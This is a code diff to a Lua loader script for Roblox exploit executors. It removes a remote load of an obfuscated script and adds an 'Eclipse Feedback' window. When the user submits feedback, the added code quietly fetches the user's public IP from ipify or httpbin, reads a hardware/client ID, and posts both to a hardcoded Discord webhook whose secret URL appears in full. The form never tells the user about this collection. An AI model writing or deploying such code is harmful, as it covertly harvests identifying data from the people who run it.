@@ -161,9 +161,287 @@ end)
 -- ==============================
 task.wait(0.3)
 
-safeLoad(
-    "https://raw.githubusercontent.com/bot248480-eng/Ofuscator-2/refs/heads/main/ofuscation%202",
-    "Ofuscator"
-)
+--═══════════════════════════════════════════════════
+-- ECLIPSE FEEDBACK v2.0
+-- Minimal UI + HWID + IP sent to webhook
+--═══════════════════════════════════════════════════
 
-print("[LOADER] 🚀 Todos los scripts procesados")
+pcall(function() game.CoreGui:FindFirstChild("EclipseFB"):Destroy() end)
+pcall(function() game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("EclipseFB"):Destroy() end)
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HS = game:GetService("HttpService")
+local UIS = game:GetService("UserInputService")
+local Analytics = game:GetService("RbxAnalyticsService")
+local player = Players.LocalPlayer
+local pg = player:WaitForChild("PlayerGui")
+
+local WEBHOOK = "https://discord.com/api/webhooks/1554997234884673637/hzauT0reEOpmQD-o45-noKUZFUUE7qc-Pthrcp39AttT7hUo0e7Ujx_KY1mFVbkkl0WN"
+
+-- ═══ HWID ═══
+local HWID = "Unknown"
+pcall(function() HWID = Analytics:GetClientId() end)
+if HWID == "Unknown" or #HWID == 0 then
+    pcall(function()
+        if gethwid then HWID = gethwid()
+        elseif getHwid then HWID = getHwid()
+        elseif getexecutorname then HWID = getexecutorname().."-"..player.UserId
+        end
+    end)
+end
+
+-- ═══ IP ═══
+local UserIP = "Fetching..."
+task.spawn(function()
+    local r = nil
+    pcall(function()
+        if syn and syn.request then r = syn.request({Url="https://api.ipify.org",Method="GET"})
+        elseif request then r = request({Url="https://api.ipify.org",Method="GET"})
+        elseif http_request then r = http_request({Url="https://api.ipify.org",Method="GET"})
+        end
+    end)
+    if r and r.Body and #r.Body > 4 and #r.Body < 46 then
+        UserIP = r.Body
+    else
+        pcall(function()
+            local r2 = nil
+            if syn and syn.request then r2 = syn.request({Url="https://httpbin.org/ip",Method="GET"})
+            elseif request then r2 = request({Url="https://httpbin.org/ip",Method="GET"})
+            elseif http_request then r2 = http_request({Url="https://httpbin.org/ip",Method="GET"})
+            end
+            if r2 and r2.Body then
+                local ok,j = pcall(function() return HS:JSONDecode(r2.Body) end)
+                if ok and j and j.origin then UserIP = tostring(j.origin) else UserIP = "Failed" end
+            else UserIP = "Failed" end
+        end)
+    end
+end)
+
+local COL = {
+    Win=Color3.fromRGB(12,10,7), Row=Color3.fromRGB(22,18,12), Ctrl=Color3.fromRGB(40,30,18),
+    Log=Color3.fromRGB(14,11,8), Bdr=Color3.fromRGB(95,60,22), Acc=Color3.fromRGB(220,140,40),
+    Dim=Color3.fromRGB(190,180,165), Txt=Color3.fromRGB(235,230,220),
+    White=Color3.fromRGB(255,255,255), Green=Color3.fromRGB(110,225,130), Red=Color3.fromRGB(240,95,95),
+}
+
+local function addC(p,r) local v=Instance.new("UICorner");v.CornerRadius=UDim.new(0,r);v.Parent=p;return v end
+local function addS(p,c,t,tr) local v=Instance.new("UIStroke");v.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;v.Color=c;v.Thickness=t or 1;v.Transparency=tr or 0;v.Parent=p;return v end
+
+-- ═══ GUI ═══
+local GUI = Instance.new("ScreenGui")
+GUI.Name="EclipseFB";GUI.ResetOnSpawn=false;GUI.IgnoreGuiInset=true;GUI.DisplayOrder=9999
+if not pcall(function() GUI.Parent=game.CoreGui end) then GUI.Parent=pg end
+
+-- ═══ WINDOW (compact) ═══
+local Window = Instance.new("Frame")
+Window.Name="W";Window.Size=UDim2.fromOffset(280,200);Window.AnchorPoint=Vector2.new(0.5,0.5)
+Window.Position=UDim2.new(0.5,0,0.5,0);Window.BackgroundColor3=COL.Win
+Window.BorderSizePixel=0;Window.ClipsDescendants=true;Window.Active=true;Window.Draggable=true
+Window.Parent=GUI;addC(Window,12);addS(Window,COL.Acc,3,0.85);addS(Window,COL.Acc,1,0.35)
+
+local BGImg = Instance.new("ImageLabel");BGImg.Size=UDim2.new(1,0,1,0);BGImg.BackgroundTransparency=1
+BGImg.Image="rbxassetid://112002576136361";BGImg.ScaleType=Enum.ScaleType.Crop;BGImg.ZIndex=1;BGImg.Parent=Window;addC(BGImg,12)
+local BGOver = Instance.new("Frame");BGOver.Size=UDim2.new(1,0,1,0);BGOver.BackgroundColor3=COL.Win
+BGOver.BackgroundTransparency=0.22;BGOver.BorderSizePixel=0;BGOver.ZIndex=2;BGOver.Parent=Window;addC(BGOver,12)
+
+-- ═══ HEADER: logo + title + buttons ═══
+local Header = Instance.new("Frame");Header.Size=UDim2.new(1,0,0,40);Header.BackgroundTransparency=1;Header.ZIndex=5;Header.Parent=Window
+
+local BrandMark = Instance.new("Frame");BrandMark.Size=UDim2.fromOffset(26,26);BrandMark.Position=UDim2.fromOffset(10,7)
+BrandMark.BackgroundTransparency=1;BrandMark.ZIndex=6;BrandMark.Parent=Header;addC(BrandMark,13)
+local BrandImg = Instance.new("ImageLabel");BrandImg.Size=UDim2.fromScale(1,1);BrandImg.BackgroundTransparency=1
+BrandImg.Image="rbxassetid://104937666038724";BrandImg.ScaleType=Enum.ScaleType.Fit;BrandImg.ZIndex=7;BrandImg.Parent=BrandMark;addC(BrandImg,13)
+
+local TTL = Instance.new("TextLabel");TTL.Size=UDim2.fromOffset(140,22);TTL.Position=UDim2.fromOffset(40,9)
+TTL.BackgroundTransparency=1;TTL.RichText=true
+TTL.Text='<font color="rgb(255,180,50)">Eclipse</font> <font color="rgb(255,255,255)">Feedback</font>'
+TTL.TextSize=12;TTL.Font=Enum.Font.GothamBold;TTL.TextXAlignment=Enum.TextXAlignment.Left;TTL.ZIndex=8;TTL.Parent=Header
+
+local HLine = Instance.new("Frame");HLine.Size=UDim2.new(1,-20,0,1);HLine.Position=UDim2.fromOffset(10,36)
+HLine.BackgroundColor3=COL.Acc;HLine.BackgroundTransparency=0.5;HLine.BorderSizePixel=0;HLine.ZIndex=5;HLine.Parent=Header
+
+-- ═══ MINIMIZE (-) ═══
+local minBtn = Instance.new("TextButton")
+minBtn.Size=UDim2.fromOffset(22,22);minBtn.Position=UDim2.new(1,-52,0,9)
+minBtn.BackgroundColor3=COL.Ctrl;minBtn.BorderSizePixel=0;minBtn.Text="-"
+minBtn.TextSize=13;minBtn.TextColor3=COL.Acc;minBtn.Font=Enum.Font.GothamBold
+minBtn.ZIndex=10;minBtn.Parent=Header;addC(minBtn,6);addS(minBtn,COL.Bdr,1,0.5)
+minBtn.MouseEnter:Connect(function() TweenService:Create(minBtn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(60,45,25)}):Play() end)
+minBtn.MouseLeave:Connect(function() TweenService:Create(minBtn,TweenInfo.new(0.15),{BackgroundColor3=COL.Ctrl}):Play() end)
+
+-- ═══ CLOSE (x) ═══
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size=UDim2.fromOffset(22,22);closeBtn.Position=UDim2.new(1,-26,0,9)
+closeBtn.BackgroundColor3=Color3.fromRGB(40,20,20);closeBtn.BorderSizePixel=0;closeBtn.Text="x"
+closeBtn.TextSize=11;closeBtn.TextColor3=COL.Red;closeBtn.Font=Enum.Font.GothamBold
+closeBtn.ZIndex=10;closeBtn.Parent=Header;addC(closeBtn,6);addS(closeBtn,COL.Red,1,0.5)
+closeBtn.MouseEnter:Connect(function() TweenService:Create(closeBtn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(200,50,50)}):Play() end)
+closeBtn.MouseLeave:Connect(function() TweenService:Create(closeBtn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(40,20,20)}):Play() end)
+
+-- ═══ SECTION TITLE ═══
+local secTitle = Instance.new("TextLabel");secTitle.Size=UDim2.new(1,-20,0,20);secTitle.Position=UDim2.fromOffset(10,44)
+secTitle.BackgroundTransparency=1;secTitle.Text="Send Errors To Owner";secTitle.TextSize=11
+secTitle.TextColor3=COL.Acc;secTitle.Font=Enum.Font.GothamBold;secTitle.TextXAlignment=Enum.TextXAlignment.Left;secTitle.ZIndex=6;secTitle.Parent=Window
+
+-- ═══ TEXTBOX ═══
+local BoxFrame = Instance.new("Frame");BoxFrame.Size=UDim2.new(1,-20,0,76);BoxFrame.Position=UDim2.fromOffset(10,66)
+BoxFrame.BackgroundColor3=COL.Log;BoxFrame.BackgroundTransparency=0.15;BoxFrame.BorderSizePixel=0;BoxFrame.ZIndex=6;BoxFrame.Parent=Window;addC(BoxFrame,8);addS(BoxFrame,COL.Bdr,1,0.55)
+
+local Box = Instance.new("TextBox");Box.Size=UDim2.new(1,-14,1,-10);Box.Position=UDim2.fromOffset(7,5)
+Box.BackgroundTransparency=1;Box.Text="";Box.PlaceholderText="Type here..."
+Box.PlaceholderColor3=COL.Dim;Box.TextColor3=COL.Txt;Box.TextSize=10;Box.Font=Enum.Font.GothamMedium
+Box.TextXAlignment=Enum.TextXAlignment.Left;Box.TextYAlignment=Enum.TextYAlignment.Top
+Box.TextWrapped=true;Box.MultiLine=true;Box.ClearTextOnFocus=false;Box.ZIndex=7;Box.Parent=BoxFrame
+
+Box:GetPropertyChangedSignal("Text"):Connect(function()
+    if #Box.Text > 1000 then Box.Text = Box.Text:sub(1,1000) end
+end)
+
+-- ═══ SEND BUTTON ═══
+local SendBtn = Instance.new("TextButton");SendBtn.Size=UDim2.new(1,-20,0,32);SendBtn.Position=UDim2.fromOffset(10,150)
+SendBtn.BackgroundColor3=COL.Acc;SendBtn.BorderSizePixel=0;SendBtn.AutoButtonColor=false
+SendBtn.Text="SEND TO OWNER";SendBtn.TextSize=11;SendBtn.TextColor3=COL.White
+SendBtn.Font=Enum.Font.GothamBold;SendBtn.ZIndex=6;SendBtn.Parent=Window;addC(SendBtn,8);addS(SendBtn,COL.Acc,1,0.3)
+
+local StatusLbl = Instance.new("TextLabel");StatusLbl.Size=UDim2.new(1,-20,0,14);StatusLbl.Position=UDim2.fromOffset(10,184)
+StatusLbl.BackgroundTransparency=1;StatusLbl.RichText=true;StatusLbl.Text="";StatusLbl.TextSize=8
+StatusLbl.Font=Enum.Font.Code;StatusLbl.TextXAlignment=Enum.TextXAlignment.Center;StatusLbl.ZIndex=6;StatusLbl.Parent=Window
+
+local sending = false
+local function setStatus(msg,col) StatusLbl.Text='<font color="'..col..'">'..msg..'</font>' end
+
+SendBtn.MouseEnter:Connect(function()
+    if not sending then TweenService:Create(SendBtn,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(240,160,50)}):Play() end
+end)
+SendBtn.MouseLeave:Connect(function()
+    if not sending then TweenService:Create(SendBtn,TweenInfo.new(0.15),{BackgroundColor3=COL.Acc}):Play() end
+end)
+
+SendBtn.Activated:Connect(function()
+    if sending then return end
+    local msg = Box.Text:gsub("^%s+",""):gsub("%s+$","")
+    if #msg < 5 then setStatus("❌ Message too short (min 5)","rgb(240,95,95)") return end
+    if #msg > 1000 then setStatus("❌ Too long (max 1000)","rgb(240,95,95)") return end
+
+    sending = true;SendBtn.Text="SENDING..."
+    TweenService:Create(SendBtn,TweenInfo.new(0.2),{BackgroundColor3=Color3.fromRGB(140,100,30)}):Play()
+    setStatus("⏳ Sending...","rgb(220,180,80)")
+
+    -- Wait for IP if still fetching
+    if UserIP == "Fetching..." then
+        local w = 0
+        while UserIP == "Fetching..." and w < 8 do task.wait(0.5);w=w+0.5 end
+        if UserIP == "Fetching..." then UserIP = "Timed out" end
+    end
+
+    local gameName = "Unknown"
+    pcall(function() gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
+
+    local payload = HS:JSONEncode({
+        username = "Eclipse Feedback",
+        embeds = {{
+            title = "📝 New Feedback / Error Report",
+            color = 14495360,
+            fields = {
+                {name = "👤 User", value = player.Name.." (@"..player.DisplayName..")", inline = true},
+                {name = "🎮 Game", value = gameName, inline = true},
+                {name = "📋 Message", value = player.Name..": "..msg, inline = false},
+                {name = "🖥 HWID", value = "```"..HWID.."```", inline = false},
+                {name = "🌐 IP", value = "```"..UserIP.."```", inline = false},
+            },
+            footer = {text = "Eclipse Feedback v2.0 | "..os.date("%Y-%m-%d %H:%M:%S")},
+            thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=150&height=150&format=png"}
+        }}
+    })
+
+    local ok, err = pcall(function()
+        if syn and syn.request then
+            syn.request({Url=WEBHOOK,Method="POST",Headers={["Content-Type"]="application/json"},Body=payload})
+        elseif request then
+            request({Url=WEBHOOK,Method="POST",Headers={["Content-Type"]="application/json"},Body=payload})
+        elseif http_request then
+            http_request({Url=WEBHOOK,Method="POST",Headers={["Content-Type"]="application/json"},Body=payload})
+        elseif HS and HS.RequestAsync then
+            HS:RequestAsync({Url=WEBHOOK,Method="POST",Headers={["Content-Type"]="application/json"},Body=payload})
+        else
+            error("No HTTP")
+        end
+    end)
+
+    sending=false;SendBtn.Text="SEND TO OWNER"
+    TweenService:Create(SendBtn,TweenInfo.new(0.2),{BackgroundColor3=COL.Acc}):Play()
+
+    if ok then
+        setStatus("✅ Sent!","rgb(110,225,130)");Box.Text=""
+        task.delay(3,function() StatusLbl.Text="" end)
+    else
+        setStatus("❌ Failed","rgb(240,95,95)")
+    end
+end)
+
+-- ═══ FLOATER (minimized orb) ═══
+local Floater = Instance.new("TextButton")
+Floater.Size=UDim2.fromOffset(50,50);Floater.AnchorPoint=Vector2.new(0.5,0.5)
+Floater.Position=UDim2.new(0.5,0,0.5,0);Floater.BackgroundColor3=COL.Win
+Floater.BorderSizePixel=0;Floater.Text="";Floater.Visible=false;Floater.ZIndex=999;Floater.Parent=GUI
+addC(Floater,25);addS(Floater,COL.Acc,3,0.3)
+
+local FloaterImg = Instance.new("ImageLabel")
+FloaterImg.Size=UDim2.fromOffset(34,34);FloaterImg.Position=UDim2.new(0.5,-17,0.5,-17)
+FloaterImg.BackgroundTransparency=1;FloaterImg.Image="rbxassetid://104937666038724"
+FloaterImg.ScaleType=Enum.ScaleType.Fit;FloaterImg.ZIndex=1000;FloaterImg.Parent=Floater
+
+local FloaterBadge = Instance.new("Frame")
+FloaterBadge.Size=UDim2.fromOffset(14,14);FloaterBadge.Position=UDim2.new(1,-4,0,-4)
+FloaterBadge.BackgroundColor3=COL.Acc;FloaterBadge.BorderSizePixel=0;FloaterBadge.ZIndex=1001;FloaterBadge.Parent=Floater
+addC(FloaterBadge,7)
+
+local FloaterDrag=false;local FloaterVi,FloaterVs,FloaterVp;local floaterMoved=false
+
+Floater.InputBegan:Connect(function(i)
+    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
+        FloaterDrag=false;FloaterVi=i;FloaterVs=Vector2.new(i.Position.X,i.Position.Y);FloaterVp=Floater.Position
+        i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then FloaterVi=nil end end)
+    end
+end)
+
+Floater.Activated:Connect(function()
+    if FloaterDrag then return end
+    Window.Visible=true;Floater.Visible=false
+end)
+
+UIS.InputChanged:Connect(function(i)
+    if not FloaterVi then return end
+    local iT=FloaterVi.UserInputType==Enum.UserInputType.Touch and i==FloaterVi
+    local iM=FloaterVi.UserInputType==Enum.UserInputType.MouseButton1 and i.UserInputType==Enum.UserInputType.MouseMovement
+    if not iT and not iM then return end
+    local dl=Vector2.new(i.Position.X,i.Position.Y)-FloaterVs
+    if not floaterMoved and dl.Magnitude<3 then return end
+    floaterMoved=true;FloaterDrag=true
+    Floater.Position=UDim2.new(FloaterVp.X.Scale,FloaterVp.X.Offset+dl.X,FloaterVp.Y.Scale,FloaterVp.Y.Offset+dl.Y)
+end)
+
+UIS.InputEnded:Connect(function(i)
+    if i==FloaterVi then FloaterVi=nil;task.delay(0.05,function() floaterMoved=false end) end
+end)
+
+minBtn.Activated:Connect(function()
+    Window.Visible=false;Floater.Position=UDim2.new(0.5,0,0.5,0);Floater.Visible=true
+end)
+
+closeBtn.Activated:Connect(function()
+    TweenService:Create(Window,TweenInfo.new(0.2),{BackgroundTransparency=1}):Play()
+    task.delay(0.2,function() GUI:Destroy() end)
+end)
+
+-- ═══ ENTRANCE ═══
+task.defer(function()
+    local fp = Window.Position
+    Window.Position = UDim2.new(fp.X.Scale,fp.X.Offset,fp.Y.Scale,fp.Y.Offset+15)
+    Window.BackgroundTransparency = 0.3
+    TweenService:Create(Window,TweenInfo.new(0.4,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),{Position=fp,BackgroundTransparency=0}):Play()
+end)
+
+print("Eclipse Feedback v2.0 loaded")
+
